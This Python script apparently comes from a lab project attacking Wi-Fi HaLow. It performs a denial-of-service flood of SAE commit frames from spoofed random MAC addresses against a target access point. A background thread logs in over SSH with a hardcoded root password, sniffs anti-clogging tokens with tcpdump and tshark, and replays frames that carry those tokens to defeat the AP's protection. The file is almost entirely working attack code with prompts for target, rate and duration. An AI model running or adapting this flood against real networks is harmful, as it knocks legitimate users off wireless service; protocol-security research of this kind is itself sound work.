import utils
import random
import time
from SDRtransmitTCP import transmitData
from attack.frames.sae_commit_frame import commit_frame
import threading
import subprocess
import sys
import os

time_filter = f'frame.time >= "{time.time()}""'
pcap = None

stop_track = threading.Event()
specific_frame = {}

def _track_cookie():
    global tshark, specific_frame
    try:
        os.sched_setaffinity(0, {2})
    except:
        print("could not set to own core, check if more cores are available to be used")
        return

    cmd = """
    sshpass -p 'halow' ssh \
    root@10.42.0.1 \
    "tcpdump --immediate-mode -nn -l -i morse0 'type mgt and subtype auth and wlan addr2 78:72:64:ea:b9:14' -U -s0 -w - 2>/dev/null" |
    tshark -l -r - -Y "wlan.fixed.anti_clogging_token" \
    -T fields \
    -e wlan.sa \
    -e wlan.da \
    -e wlan.fixed.anti_clogging_token\
    """

    tshark = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        bufsize = 0,
        universal_newlines=True
    )
    stdout = tshark.stdout
    # loop through the output of stdout
    
    while not stop_track.is_set():
        output = stdout.readline()
        if not output:
            continue

        ap_mac, rand_mac, cookie = output.strip().split("\t")
        cookie_b = bytes.fromhex(cookie.replace(":", ""))
        if rand_mac is not None and cookie is not None:
            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=rand_mac,cookie=cookie_b)
            transmitData(frame_bytes)

    #terminate subprocesses
    tshark.terminate()

def random_mac():
    """
    Generate a random spoofed client MAC.
    
    return: random string of mac addresses
    """
    first = (random.randint(0, 255) | 0x02) & ~0x01  # local + unicast
    rest = [random.randint(0, 255) for _ in range(5)]
    return ':'.join(f'{b:02x}' for b in [first] + rest)

def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16, mac_no:int=20):
    global specific_frame
    """
    Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
    Each frame forces the AP to run hash-to-curve (expensive ECC operation).
    """

    print(f"[*] Flooding {ap_mac} at a rate of {rate} SAE commit frames per second with {mac_no} spoof frames")
    start_time = time.time()
    frame_bytes = None
    random_macs = [random_mac() for _ in range(mac_no)]
    i = 0
    
    while time.time()- start_time < duration:
        src = random_macs[i]
        i += 1
        if i == len(random_macs):
            i = 0
        
        frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=None)
        transmitData(frame_bytes)
        if src not in specific_frame:
            specific_frame[src] = time.time()
        time.sleep(1/rate)

def start_dos():
    #start threading
    print("which mac do you want to target (leave empty for default AP MAC): ")
    target = input("MAC: ")

    if target == "":
        ap_mac = utils.get_mac("TrustedAP")[0]
    else:
        ap_mac = target

    #set the durations
    duration = int(input("Duration of attack (in seconds): "))
    rate = float(input("enter rate of frames to transmit: "))
    mac_no = int(input("enter the number of spoofed frames to be used: "))
    threading.Thread(target=_track_cookie,daemon=True).start()
    time.sleep(1)
    og_interval = sys.getswitchinterval()
    sys.setswitchinterval(0.0005)
    stop_track.clear()

    flood_sae_commits(ap_mac, duration, rate, mac_no)

    sys.setswitchinterval(og_interval)
    #stop threading
    stop_track.set()
    tshark.wait()



